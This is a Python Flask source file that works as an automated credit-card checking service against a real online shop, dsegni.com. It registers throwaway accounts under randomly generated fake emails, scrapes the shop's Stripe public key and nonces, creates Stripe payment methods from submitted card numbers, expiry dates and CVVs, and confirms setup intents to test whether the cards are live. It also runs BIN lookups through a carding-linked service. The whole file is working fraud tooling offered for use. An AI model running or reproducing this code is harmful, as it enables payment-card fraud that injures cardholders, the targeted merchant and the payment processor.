from flask import Flask, jsonify, Response
import requests
import re
import json
import random
import string
from typing import Any, Dict, Optional, Tuple
from datetime import datetime

app = Flask(__name__)

# Email domains for random generation
EMAIL_DOMAINS = [
    'gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 
    'icloud.com', 'protonmail.com', 'mail.com', 'aol.com',
    'yandex.com', 'zoho.com'
]

# Common first names and last names for email generation
FIRST_NAMES = [
    'john', 'jane', 'michael', 'sarah', 'david', 'lisa', 'robert', 'emily',
    'william', 'jennifer', 'richard', 'susan', 'joseph', 'maria', 'thomas',
    'karen', 'charles', 'nancy', 'christopher', 'betty', 'daniel', 'sandra',
    'matthew', 'ashley', 'anthony', 'kimberly', 'donald', 'emma', 'mark',
    'elizabeth', 'paul', 'michelle', 'steven', 'amanda', 'andrew', 'melissa',
    'joshua', 'deborah', 'kevin', 'stephanie', 'brian', 'rebecca', 'george',
    'laura', 'edward', 'sharon', 'ronald', 'cynthia', 'timothy', 'kathleen'
]

LAST_NAMES = [
    'smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller',
    'davis', 'rodriguez', 'martinez', 'hernandez', 'lopez', 'gonzalez',
    'wilson', 'anderson', 'thomas', 'taylor', 'moore', 'jackson', 'martin',
    'lee', 'perez', 'thompson', 'white', 'harris', 'sanchez', 'clark',
    'ramirez', 'lewis', 'robinson', 'walker', 'young', 'allen', 'king',
    'wright', 'scott', 'torres', 'nguyen', 'hill', 'flores', 'green',
    'adams', 'nelson', 'baker', 'hall', 'rivera', 'campbell', 'mitchell',
    'carter', 'roberts'
]

@app.route('/')
def home() -> str:
    return "API is running. Use /add_payment_method/<details> or /add_payment_method_with_email/<email>/<details>"

def generate_random_email() -> str:
    """Generate a realistic random email address."""
    
    # Choose random name combination
    first_name = random.choice(FIRST_NAMES)
    last_name = random.choice(LAST_NAMES)
    domain = random.choice(EMAIL_DOMAINS)
    
    # Decide email format (various common patterns)
    email_patterns = [
        f"{first_name}.{last_name}",          # john.smith
        f"{first_name}{last_name}",           # johnsmith
        f"{first_name}_{last_name}",          # john_smith
        f"{first_name[0]}{last_name}",        # jsmith
        f"{first_name}{random.randint(1, 999)}",  # john123
        f"{first_name}{last_name[0]}",        # johns
        f"{first_name}{random.randint(10, 99)}{last_name}",  # john23smith
        f"{first_name[0]}.{last_name}",       # j.smith
    ]
    
    username = random.choice(email_patterns)
    return f"{username}@{domain}".lower()

def extract_stripe_public_key(html_content: str) -> Optional[str]:
    """Extract Stripe public key from HTML content."""
    
    # Pattern 1: Look for Stripe public key in script tags
    patterns = [
        # Pattern for wc_stripe_params
        r'"stripe":\s*{[^}]+"key":\s*"([^"]+)"',
        # Pattern for stripe publishableKey
        r'"publishableKey":\s*"([^"]+)"',
        # Pattern for pk_live_ or pk_test_ in scripts
        r'"pk_(live|test)_[^"]+"',
        # Direct key pattern
        r'pk_(live|test)_[A-Za-z0-9_]+',
        # In wc_stripe_params object
        r'var\s+wc_stripe_(?:upe_)?params\s*=\s*({[^}]+})',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, html_content, re.DOTALL | re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            
            # If we found the full params object, parse it
            if pattern == patterns[-1] and match.startswith('{'):
                try:
                    # Clean JSON
                    cleaned = re.sub(r',\s*}', '}', match)
                    cleaned = re.sub(r',\s*]', ']', cleaned)
                    params = json.loads(cleaned)
                    if 'key' in params:
                        return params['key']
                except:
                    continue
            
            # Check if it's a Stripe public key
            if match and ('pk_live_' in match or 'pk_test_' in match):
                # Clean up if needed
                if match.startswith('"') and match.endswith('"'):
                    match = match[1:-1]
                return match
    
    # Additional search in inline scripts
    script_pattern = r'<script[^>]*>(.*?)</script>'
    scripts = re.findall(script_pattern, html_content, re.DOTALL | re.IGNORECASE)
    
    for script in scripts:
        if 'pk_live_' in script or 'pk_test_' in script:
            # Try to extract using more specific patterns
            key_match = re.search(r'["\'](pk_(?:live|test)_[A-Za-z0-9_]+)["\']', script)
            if key_match:
                return key_match.group(1)
    
    return None

def get_stripe_public_key(session: requests.Session, headers: Dict[str, str]) -> str:
    """Fetch the website and extract Stripe public key."""
    
    # Try multiple URLs where Stripe key might be present
    urls_to_try = [
        'https://www.dsegni.com/en/my-account/add-payment-method/',
        'https://www.dsegni.com/en/checkout/',
        'https://www.dsegni.com/en/shop/',
        'https://www.dsegni.com/',
        'https://www.dsegni.com/en/my-account/',
    ]
    
    for url in urls_to_try:
        try:
            response = session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                pk_key = extract_stripe_public_key(response.text)
                if pk_key:
                    return pk_key
        except Exception as e:
            print(f"Error fetching {url}: {e}")
            continue
    
    raise ValueError("Could not extract Stripe public key from any page")

def register_new_user(session: requests.Session, headers: Dict[str, str], email: str) -> bool:
    """Register a new user with only email (no username/password needed)."""
    
    # Step 1: Get the registration page to extract nonce
    register_url = 'https://www.dsegni.com/en/my-account/'
    try:
        response = session.get(register_url, headers=headers, timeout=10)
        if response.status_code != 200:
            return False
        
        html = response.text
        
        # Extract registration nonce
        nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]*)"', html)
        if not nonce_match:
            # Try alternative pattern
            nonce_match = re.search(r'"woocommerce-register-nonce":"([^"]*)"', html)
            if not nonce_match:
                return False
        
        register_nonce = nonce_match.group(1)
        
        # Step 2: Check if email-only registration is supported
        # Look for email-only registration patterns in the form
        if 'email' in html.lower() and 'register' in html.lower():
            # Try email-only registration
            register_data = {
                'email': email,
                'woocommerce-register-nonce': register_nonce,
                'register': 'Register',
                '_wp_http_referer': '/en/my-account/'
            }
            
            register_response = session.post(register_url, headers=headers, data=register_data)
            
            # Check if registration was successful
            if register_response.status_code == 200:
                success_indicators = [
                    'dashboard',
                    'my account',
                    'registration complete',
                    'your account was created successfully',
                    'account details',
                    'welcome to your account',
                    'check your email',
                    'confirmation email'
                ]
                
                page_content_lower = register_response.text.lower()
                if any(indicator in page_content_lower for indicator in success_indicators):
                    print(f"Successfully registered user with email: {email}")
                    return True
                
                # Check for WooCommerce specific success messages
                if 'woocommerce-message' in page_content_lower or 'success' in page_content_lower:
                    print(f"Registration appears successful for email: {email}")
                    return True
        
        return False
        
    except Exception as e:
        print(f"Registration error: {e}")
        return False

def validate_email_format(email: str) -> bool:
    """Validate email format."""
    email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(email_pattern, email))

def get_current_time_str() -> str:
    """Get current time as formatted string."""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def calculate_time_taken(start_time_str: str, end_time_str: str) -> str:
    """Calculate time difference between start and end times."""
    try:
        start_time = datetime.strptime(start_time_str, "%Y-%m-%d %H:%M:%S")
        end_time = datetime.strptime(end_time_str, "%Y-%m-%d %H:%M:%S")
        time_diff = end_time - start_time
        
        # Format as seconds with 2 decimal places
        seconds = time_diff.total_seconds()
        return f"{seconds:.2f}s"
    except:
        return "N/A"

def fetch_bin_info(bin_number: str) -> Dict[str, Any]:
    """
    Fetch BIN (Bank Identification Number) information from antipublic API.
    
    Args:
        bin_number: First 6 digits of credit card
    
    Returns:
        Dictionary containing BIN information or error details
    """
    try:
        # Validate BIN
        if not bin_number or len(bin_number) != 6 or not bin_number.isdigit():
            return {"error": "Invalid BIN number. Must be exactly 6 digits."}
        
        # API endpoint
        url = f"https://bins.antipublic.cc/bins/{bin_number}"
        
        # Headers
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json',
            'Referer': 'https://bins.antipublic.cc/'
        }
        
        # Make request
        response = requests.get(url, headers=headers, timeout=5)
        
        # Check response
        if response.status_code == 200:
            data = response.json()
            return {
                "success": True,
                "bin": bin_number,
                "data": data
            }
        elif response.status_code == 404:
            return {
                "error": f"BIN {bin_number} not found in database",
                "status_code": 404
            }
        else:
            return {
                "error": f"API returned status code {response.status_code}",
                "status_code": response.status_code,
                "response_text": response.text[:200] if response.text else ""
            }
            
    except requests.exceptions.Timeout:
        return {
            "error": "BIN lookup timeout (5 seconds)",
            "status_code": 408
        }
    except requests.exceptions.RequestException as e:
        return {
            "error": f"Network error: {str(e)}"
        }
    except json.JSONDecodeError as e:
        return {
            "error": f"Invalid JSON response: {str(e)}"
        }
    except Exception as e:
        return {
            "error": f"Unexpected error: {str(e)}"
        }

# THIS FUNCTION MUST BE DEFINED BEFORE THE ROUTES THAT USE IT
def _add_payment_method_with_email_and_bin(email: str, details: str, start_time: str, 
                                          bin_info: Optional[Dict[str, Any]] = None, 
                                          bin_lookup_time: Optional[str] = None) -> Response:
    """Internal function to handle adding payment method with email and BIN info."""
    try:
        # Extract card details from URL path
        parts = details.split('|')
        if len(parts) != 4:
            end_time = get_current_time_str()
            response_data = {
                'error': 'Invalid card details format. Use cc|mm|yy|cvv',
                'Time': calculate_time_taken(start_time, end_time)
            }
            if bin_info:
                response_data['bin_lookup'] = bin_info
            if bin_lookup_time:
                response_data['bin_lookup_time'] = bin_lookup_time
            return jsonify(response_data), 400
            
        cc, mm, yy, cvv = parts

        # Create a session to persist cookies across requests
        session = requests.Session()

        # Common headers
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'referer': 'https://www.dsegni.com/en/my-account/',
        }

        # Step 1: Register new user with email only
        registration_success = register_new_user(session, headers, email)
        if not registration_success:
            # Try one more time with a different email if first attempt fails
            print(f"First registration attempt failed for {email}, trying new email...")
            email = generate_random_email()
            print(f"Trying new email: {email}")
            registration_success = register_new_user(session, headers, email)
            
            if not registration_success:
                end_time = get_current_time_str()
                response_data = {
                    'error': 'User registration failed after multiple attempts',
                    'Time': calculate_time_taken(start_time, end_time)
                }
                if bin_info:
                    response_data['bin_lookup'] = bin_info
                if bin_lookup_time:
                    response_data['bin_lookup_time'] = bin_lookup_time
                return jsonify(response_data), 500

        # Step 2: Dynamically extract Stripe public key
        try:
            Pk_key = get_stripe_public_key(session, headers)
            print(f"Extracted Stripe key: {Pk_key[:20]}...")  # Log first 20 chars for debugging
        except ValueError as e:
            end_time = get_current_time_str()
            response_data = {
                'error': str(e),
                'Time': calculate_time_taken(start_time, end_time)
            }
            if bin_info:
                response_data['bin_lookup'] = bin_info
            if bin_lookup_time:
                response_data['bin_lookup_time'] = bin_lookup_time
            return jsonify(response_data), 500

        # Step 3: Fetch the add payment method page (now authenticated)
        page_url = 'https://www.dsegni.com/en/my-account/add-payment-method/'
        page_response = session.get(page_url, headers=headers)
        html = page_response.text

        # Extract Stripe params (wc_stripe_params or wc_stripe_upe_params)
        pattern = r"var\s+(wc_stripe_(?:upe_)?params)\s*=\s*(\{.*?\});"
        match = re.search(pattern, html, re.DOTALL)
        if not match:
            end_time = get_current_time_str()
            response_data = {
                'error': 'Stripe params not found on page',
                'Time': calculate_time_taken(start_time, end_time)
            }
            if bin_info:
                response_data['bin_lookup'] = bin_info
            if bin_lookup_time:
                response_data['bin_lookup_time'] = bin_lookup_time
            return jsonify(response_data), 500
        
        params_str = match.group(2)

        # Clean trailing commas in JSON (common in inline scripts)
        params_str = re.sub(r",\s*}", "}", params_str)
        params_str = re.sub(r",\s*]", "]", params_str)
        wc_params = json.loads(params_str)

        # Get the correct nonce for creating setup intent
        ajax_nonce = wc_params.get('createAndConfirmSetupIntentNonce')
        if not ajax_nonce:
            # Fallback: look for any relevant nonce
            possible_nonces = [k for k in wc_params.keys() if 'nonce' in k.lower() and ('setup' in k.lower() or 'intent' in k.lower())]
            if possible_nonces:
                ajax_nonce = wc_params.get(possible_nonces[0])
            else:
                end_time = get_current_time_str()
                response_data = {
                    'error': 'No valid nonce found for setup intent',
                    'Time': calculate_time_taken(start_time, end_time)
                }
                if bin_info:
                    response_data['bin_lookup'] = bin_info
                if bin_lookup_time:
                    response_data['bin_lookup_time'] = bin_lookup_time
                return jsonify(response_data), 500

        # Step 4: Create payment method directly via Stripe API using dynamically extracted key
        stripe_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }
        
        # Use the dynamically extracted Stripe public key
        stripe_data = (
            f'type=card'
            f'&card[number]={cc}'
            f'&card[cvc]={cvv}'
            f'&card[exp_year]={yy}'
            f'&card[exp_month]={mm}'
            f'&allow_redisplay=unspecified'
            f'&billing_details[address][postal_code]=10009'
            f'&billing_details[address][country]=US'
            f'&pasted_fields=number'
            f'&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+payment-element%3B+deferred-intent'
            f'&referrer=https%3A%2F%2Fwww.dsegni.com'
            f'&time_on_page=54564'
            f'&key={Pk_key}'  # Using dynamically extracted key
            f'&_stripe_version=2024-06-20'
        )
        
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data
        )
        pm_json = pm_response.json()
        if 'error' in pm_json:
            end_time = get_current_time_str()
            response_data = {
                'error': f"Stripe PM creation failed: {pm_json['error']['message']}",
                'Time': calculate_time_taken(start_time, end_time)
            }
            if bin_info:
                response_data['bin_lookup'] = bin_info
            if bin_lookup_time:
                response_data['bin_lookup_time'] = bin_lookup_time
            return jsonify(response_data), 500
        
        pm_id = pm_json['id']

        # Step 5: Confirm setup intent via WooCommerce AJAX
        ajax_headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.dsegni.com',
            'referer': 'https://www.dsegni.com/en/my-account/add-payment-method/',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }
        ajax_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        final_response = session.post(
            'https://www.dsegni.com/wp-admin/admin-ajax.php',
            headers=ajax_headers,
            data=ajax_data
        )
        final_json = final_response.json() if final_response.headers.get('content-type', '').startswith('application/json') else {'raw': final_response.text}
        
        end_time = get_current_time_str()
        
        # Prepare response with BIN info if available
        response_data = {
            'success': True,
            'email': email,
            'payment_method_id': pm_id,
            'stripe_key_used': Pk_key[:20] + '...',
            'final_response': final_json,
            'Time': calculate_time_taken(start_time, end_time)
        }
        
        # Add BIN information if available
        if bin_info:
            response_data['bin_lookup'] = bin_info
        if bin_lookup_time:
            response_data['bin_lookup_time'] = bin_lookup_time
        
        # Add card details summary (masked for security)
        bin_number = cc[:6] if len(cc) >= 6 else cc
        response_data['card_summary'] = {
            'bin': bin_number,
            'card_length': len(cc),
            'card_masked': f"{cc[:6]}******{cc[-4:]}" if len(cc) > 10 else cc,
            'expiry': f"{mm}/{yy}"
        }
        
        return jsonify(response_data)
        
    except Exception as e:
        end_time = get_current_time_str()
        response_data = {
            'error': str(e),
            'Time': calculate_time_taken(start_time, end_time)
        }
        if bin_info:
            response_data['bin_lookup'] = bin_info
        if bin_lookup_time:
            response_data['bin_lookup_time'] = bin_lookup_time
        return jsonify(response_data), 500

# ROUTES START HERE - CRITICAL: The function above must be defined before these routes
@app.route('/add_payment_method/<details>', methods=['GET'])
def add_payment_method_auto_email(details: str) -> Response:
    """Automatically generate email and add payment method with BIN lookup."""
    start_time = get_current_time_str()
    bin_lookup_time = None
    bin_info = None
    
    try:
        # Generate random email
        email = generate_random_email()
        print(f"Generated email: {email}")
        
        # Extract card details from URL path
        parts = details.split('|')
        if len(parts) != 4:
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Invalid card details format. Use cc|mm|yy|cvv',
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        cc, mm, yy, cvv = parts
        if not all([cc, mm, yy, cvv]):
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Missing required card details',
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        # Perform BIN lookup (extract first 6 digits)
        bin_number = cc[:6] if len(cc) >= 6 else cc
        bin_lookup_start = get_current_time_str()
        bin_info = fetch_bin_info(bin_number)
        bin_lookup_end = get_current_time_str()
        bin_lookup_time = calculate_time_taken(bin_lookup_start, bin_lookup_end)
        
        # Continue with payment method addition
        return _add_payment_method_with_email_and_bin(email, details, start_time, bin_info, bin_lookup_time)
        
    except Exception as e:
        end_time = get_current_time_str()
        response_data = {
            'error': str(e), 
            'Time': calculate_time_taken(start_time, end_time)
        }
        if bin_info:
            response_data['bin_lookup'] = bin_info
        if bin_lookup_time:
            response_data['bin_lookup_time'] = bin_lookup_time
        return jsonify(response_data), 500

@app.route('/add_payment_method_with_email/<email>/<details>', methods=['GET'])
def add_payment_method_with_email(email: str, details: str) -> Response:
    """Add payment method with provided email and include BIN lookup."""
    start_time = get_current_time_str()
    bin_lookup_time = None
    bin_info = None
    
    try:
        # Validate email format
        if not validate_email_format(email):
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Invalid email format', 
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        # Extract card details from URL path
        parts = details.split('|')
        if len(parts) != 4:
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Invalid card details format. Use cc|mm|yy|cvv',
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        cc, mm, yy, cvv = parts
        if not all([cc, mm, yy, cvv]):
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Missing required card details',
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        # Perform BIN lookup (extract first 6 digits)
        bin_number = cc[:6] if len(cc) >= 6 else cc
        bin_lookup_start = get_current_time_str()
        bin_info = fetch_bin_info(bin_number)
        bin_lookup_end = get_current_time_str()
        bin_lookup_time = calculate_time_taken(bin_lookup_start, bin_lookup_end)
        
        # Continue with payment method addition
        return _add_payment_method_with_email_and_bin(email, details, start_time, bin_info, bin_lookup_time)
        
    except Exception as e:
        end_time = get_current_time_str()
        response_data = {
            'error': str(e), 
            'Time': calculate_time_taken(start_time, end_time)
        }
        if bin_info:
            response_data['bin_lookup'] = bin_info
        if bin_lookup_time:
            response_data['bin_lookup_time'] = bin_lookup_time
        return jsonify(response_data), 500

@app.route('/register_user', methods=['GET'])
def register_user_auto() -> Response:
    """Endpoint to register a random user with email only."""
    start_time = get_current_time_str()
    try:
        email = generate_random_email()
        
        # Create a session
        session = requests.Session()
        
        # Common headers
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'referer': 'https://www.dsegni.com/en/my-account/',
        }
        
        # Register new user with email only
        success = register_new_user(session, headers, email)
        end_time = get_current_time_str()
        
        if success:
            return jsonify({
                'success': True,
                'message': 'User registered successfully with email only',
                'email': email,
                'Time': calculate_time_taken(start_time, end_time)
            })
        else:
            # Try one more time
            email = generate_random_email()
            success = register_new_user(session, headers, email)
            end_time = get_current_time_str()
            
            if success:
                return jsonify({
                    'success': True,
                    'message': 'User registered successfully on second attempt',
                    'email': email,
                    'Time': calculate_time_taken(start_time, end_time)
                })
            else:
                return jsonify({
                    'error': 'User registration failed after multiple attempts',
                    'Time': calculate_time_taken(start_time, end_time)
                }), 500
            
    except Exception as e:
        end_time = get_current_time_str()
        return jsonify({
            'error': str(e),
            'Time': calculate_time_taken(start_time, end_time)
        }), 500

@app.route('/register_user_with_email/<email>', methods=['GET'])
def register_user_with_email(email: str) -> Response:
    """Endpoint to register a user with specific email only."""
    start_time = get_current_time_str()
    try:
        if not validate_email_format(email):
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Invalid email format',
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        # Create a session
        session = requests.Session()
        
        # Common headers
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'referer': 'https://www.dsegni.com/en/my-account/',
        }
        
        # Register new user with email only
        success = register_new_user(session, headers, email)
        end_time = get_current_time_str()
        
        if success:
            return jsonify({
                'success': True,
                'message': f'User {email} registered successfully with email only',
                'email': email,
                'Time': calculate_time_taken(start_time, end_time)
            })
        else:
            return jsonify({
                'error': 'User registration failed',
                'Time': calculate_time_taken(start_time, end_time)
            }), 500
            
    except Exception as e:
        end_time = get_current_time_str()
        return jsonify({
            'error': str(e),
            'Time': calculate_time_taken(start_time, end_time)
        }), 500

@app.route('/generate_emails/<int:count>', methods=['GET'])
def generate_emails(count: int) -> Response:
    """Generate multiple random emails."""
    start_time = get_current_time_str()
    try:
        if count < 1 or count > 100:
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Count must be between 1 and 100',
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        emails = [generate_random_email() for _ in range(count)]
        end_time = get_current_time_str()
        
        return jsonify({
            'success': True,
            'count': count,
            'emails': emails,
            'Time': calculate_time_taken(start_time, end_time)
        })
    except Exception as e:
        end_time = get_current_time_str()
        return jsonify({
            'error': str(e),
            'Time': calculate_time_taken(start_time, end_time)
        }), 500

@app.route('/bin_lookup/<bin_number>', methods=['GET'])
def bin_lookup(bin_number: str) -> Response:
    """
    Endpoint to fetch BIN information.
    
    Usage: /bin_lookup/123456
    Returns: JSON with BIN details including bank, card type, country, etc.
    """
    start_time = get_current_time_str()
    try:
        # Fetch BIN information
        bin_info = fetch_bin_info(bin_number)
        end_time = get_current_time_str()
        
        # Add timing information
        if "success" in bin_info and bin_info["success"]:
            bin_info["Time"] = calculate_time_taken(start_time, end_time)
        else:
            bin_info["Time"] = calculate_time_taken(start_time, end_time)
            bin_info["bin_queried"] = bin_number
        
        return jsonify(bin_info)
        
    except Exception as e:
        end_time = get_current_time_str()
        return jsonify({
            'error': f"Unexpected error: {str(e)}",
            'bin_queried': bin_number,
            'Time': calculate_time_taken(start_time, end_time)
        }), 500

@app.route('/bin_lookup_from_card/<card_details>', methods=['GET'])
def bin_lookup_from_card(card_details: str) -> Response:
    """
    Extract BIN from full card details and fetch information.
    
    Usage: /bin_lookup_from_card/123456|mm|yy|cvv
    or /bin_lookup_from_card/1234567890123456|mm|yy|cvv
    """
    start_time = get_current_time_str()
    try:
        # Parse card details
        parts = card_details.split('|')
        if len(parts) < 1:
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Invalid format. Use /bin_lookup_from_card/card_number|mm|yy|cvv or just /bin_lookup_from_card/card_number',
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        card_number = parts[0].strip()
        
        # Extract BIN (first 6 digits)
        if len(card_number) < 6:
            end_time = get_current_time_str()
            return jsonify({
                'error': f'Card number too short for BIN extraction. Need at least 6 digits, got {len(card_number)}',
                'card_number_provided': card_number,
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        bin_number = card_number[:6]
        
        # Fetch BIN information
        bin_info = fetch_bin_info(bin_number)
        end_time = get_current_time_str()
        
        # Add additional information
        if "success" in bin_info and bin_info["success"]:
            bin_info["full_card_length"] = len(card_number)
            bin_info["card_number_masked"] = f"{card_number[:6]}******{card_number[-4:]}" if len(card_number) > 10 else card_number
            bin_info["Time"] = calculate_time_taken(start_time, end_time)
        else:
            bin_info["full_card_length"] = len(card_number)
            bin_info["bin_extracted"] = bin_number
            bin_info["Time"] = calculate_time_taken(start_time, end_time)
        
        return jsonify(bin_info)
        
    except Exception as e:
        end_time = get_current_time_str()
        return jsonify({
            'error': f"Unexpected error: {str(e)}",
            'card_details_provided': card_details,
            'Time': calculate_time_taken(start_time, end_time)
        }), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
